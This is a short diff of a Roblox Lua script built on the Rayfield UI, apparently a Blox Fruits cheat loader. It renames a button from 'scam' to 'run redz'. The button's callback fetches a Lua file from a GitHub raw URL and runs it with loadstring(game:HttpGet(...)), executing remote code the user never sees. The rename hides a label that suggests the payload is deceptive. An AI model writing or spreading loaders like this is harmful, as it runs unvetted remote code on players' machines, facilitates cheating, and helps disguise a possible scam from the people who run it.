@@ -37,7 +37,7 @@ local Window = Rayfield:CreateWindow({
 local MainTab = Window:CreateTab("🌊", 4483362458) -- nil, Image
 local MainSection = MainTab:CreateSection("Main")
 local Button = MainTab:CreateButton({
-   Name = "scam",
+   Name = "run redz",
    Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/owshat/Bloxfruits/refs/heads/main/Bloxfurit.lua',true))()
    end,
